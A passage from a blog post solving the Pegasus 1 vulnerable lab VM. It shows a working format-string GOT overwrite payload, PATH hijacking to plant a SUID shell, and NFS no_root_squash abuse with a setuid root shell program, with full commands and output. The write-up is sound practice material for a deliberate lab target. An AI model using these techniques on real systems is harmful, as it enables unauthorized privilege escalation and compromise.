</span><span class='line'>
</span><span class='line'><span class="c"># inspect the new address the GOT points to for printf()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049bfc
</span><span class='line'>0x8049bfc &lt;<span class="nb">printf</span>@got.plt&gt;: 0x00000004
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># prep the input file</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> &gt; t
</span><span class='line'>mike@pegasus:~<span class="err">$</span>
</span><span class='line'>
</span><span class='line'><span class="c"># run it in the debugger</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r &lt;t
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>Starting program: /home/mike/my_first &lt;t
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: ����
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>sh: 1: Selection:: not found
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x08c3f98c in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># check where the GOT points to for printf()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049bfc
</span><span class='line'>0x8049bfc &lt;<span class="nb">printf</span>@got.plt&gt;: 0x40069060
</span><span class='line'>
</span><span class='line'><span class="c"># confirm system() is still there :)</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x40069060 &lt;system&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>

<h4>finishing the exploit</h4>

<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>

<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Prep Selection: to make a SUID shell for john</span>
</span><span class='line'><span class="c"># and modify PATH</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>cat tojohn.c
</span><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'>int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;cp /bin/sh /tmp/tojohn&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;chmod 4777 /tmp/tojohn&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>gcc tojohn.c -o <span class="s2">&quot;Selection:&quot;</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/mike/:<span class="nv">$PATH</span>
</span><span class='line'>
</span><span class='line'><span class="c"># run the exploit...</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39;</span> <span class="p">|</span> ./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: ����
</span><span class='line'>
</span><span class='line'>                     10
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ... and check /tmp</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>ls -lah /tmp/
</span><span class='line'>total 108K
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
</span><span class='line'>drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
</span><span class='line'>-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
</span><span class='line'>mike@pegasus:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>/tmp/tojohn
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>hoofing (rooting) Pegasus</h2>

<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>

<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>john on this host:
</span><span class='line'>    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User john may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/nfs
</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo nfs
</span><span class='line'>Usage: nfs <span class="o">[</span>start<span class="p">|</span>stop<span class="o">]</span>
</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo nfs start
</span><span class='line'> * Exporting directories <span class="k">for </span>NFS kernel daemon...                                                                                                                                 <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'> * Starting NFS kernel daemon                                                                                                                                                     <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'>john@pegasus:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>

<p>So, I mounted the share&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# mkdir nfs
</span><span class='line'>root@kali:~# mount 192.168.56.101:/opt/nfs nfs
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; prepped a SUID shell &hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/pegasus/nfs# cat shell.c
</span><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
</span><span class='line'>root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
</span><span class='line'>root@kali:~/Desktop/pegasus/nfs# ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
</span><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
</span><span class='line'>-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
</span><span class='line'>-rw-r--r-- 1 root root   79 Dec 23 14:39 shell.c
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; and rooted Pegasus :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:~<span class="nv">$ </span>/opt/nfs/shell
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>john<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>flag :)</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'># cat /root/flag
</span><span class='line'>               ,
</span><span class='line'>               |`\
</span><span class='line'>              /&#39;_/_
</span><span class='line'>            ,&#39;_/\_/\_                       ,
</span><span class='line'>          ,&#39;_/\&#39;_\_,/_                    ,&#39;|
</span><span class='line'>        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
</span><span class='line'>      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
</span><span class='line'>    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&lt;_,&#39; _,\_,/      known creatures in Greek
</span><span class='line'>   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
</span><span class='line'>    \_`\&gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
</span><span class='line'>     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
</span><span class='line'>      \_&#39;/&gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
</span><span class='line'>        &gt;/  _ ,V  ,&lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
</span><span class='line'>      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
</span><span class='line'>     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
</span><span class='line'>      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
</span><span class='line'>       \_)   &gt;        `\_                           It was a hardware clone of
</span><span class='line'>            /  `,      |`\_                         the Nintendo Famicom.
</span><span class='line'>           /    \     / \ `\
</span><span class='line'>          /   __/|   /  /  `\
</span><span class='line'>         (`  (   (` (_  \   /
</span><span class='line'>         /  ,/    |  /  /   \
</span><span class='line'>        / ,/      | /   \   `\_
</span><span class='line'>      _/_/        |/    /__/,_/
</span><span class='line'>     /_(         /_(
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>CONGRATULATIONS! You made it :)
</span><span class='line'>
</span><span class='line'>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
</span><span class='line'>learnt a thing or two while doing it! :)
</span><span class='line'>
</span><span class='line'>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
</span><span class='line'>providing first review.
</span><span class='line'>
</span><span class='line'>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
</span><span class='line'>and leave some feedback, I would love to hear from you!
</span><span class='line'>
</span><span class='line'>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
</span><span class='line'>more awesome boot2root VMs!
</span></code></pre></td></tr></table></div></figure>


<p>Thanks for the fun <a href="https://twitter.com/theknapsy">@TheKnapsy</a></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>

      








  


<time datetime="2014-12-23T08:29:49+02:00" pubdate data-updated="true">Dec 23<sup>rd</sup>, 2014</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/challenge/'>challenge</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/solution/'>solution</a>, <a class='category' href='/blog/categories/vulnerable-vm/'>vulnerable vm</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/" title="Previous Post: playing in the playground - a offsec virtual pentesting labs review">&laquo; playing in the playground - a offsec virtual pentesting labs review</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/" title="Next Post: no more jailbreak detection - an adventure into Android app reversing and smali patching">no more jailbreak detection - an adventure into Android app reversing and smali patching &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <br>
  <p>
    <a href="https://leonjza.github.io/about/">Another caffeine fueled security guy.</a>
 </p>
</section>
<section>
 <p>
    <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="https://i.imgur.com/Ew3ZXtn.png"></a>
 </p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/">no more jailbreak detection - an adventure into Android app reversing and smali patching</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/23/hoof-to-root-solving-pegasus-1/">hoof to root ? - solving pegasus 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">playing in the playground - a offsec virtual pentesting labs review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/trying-harder-oscp-and-me/">trying harder - oscp and me</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/09/solving-kvasir-netcat-edition/">solving kvasir - netcat edition</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
